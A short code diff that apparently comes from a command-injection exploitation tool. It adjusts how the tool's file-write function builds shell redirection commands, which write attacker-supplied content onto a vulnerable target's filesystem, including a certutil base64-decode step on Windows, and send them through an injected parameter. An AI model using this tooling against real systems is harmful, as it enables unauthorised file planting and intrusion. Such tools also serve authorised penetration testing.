@@ -95,7 +95,7 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
     # Find filename
     filname = os.path.basename(dest_to_write)
     tmp_filname = "tmp_" + filname
-    cmd = settings.FILE_WRITE + " " + content + " > " + tmp_filname + separator + settings.WIN_COMMENT
+    cmd = settings.FILE_WRITE + " " + content + ">" + tmp_filname + separator + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     # Decode base 64 encoding
     cmd = "certutil -decode "  + tmp_filname + " " + filname + separator + settings.WIN_COMMENT
@@ -110,7 +110,7 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
     dest_to_write = path + "\\" + filname 
 
   else:
-    cmd = settings.FILE_WRITE + " '" + content + "'" + " > " + "'" + dest_to_write + "'"
+    cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     shell = "".join(str(p) for p in shell)
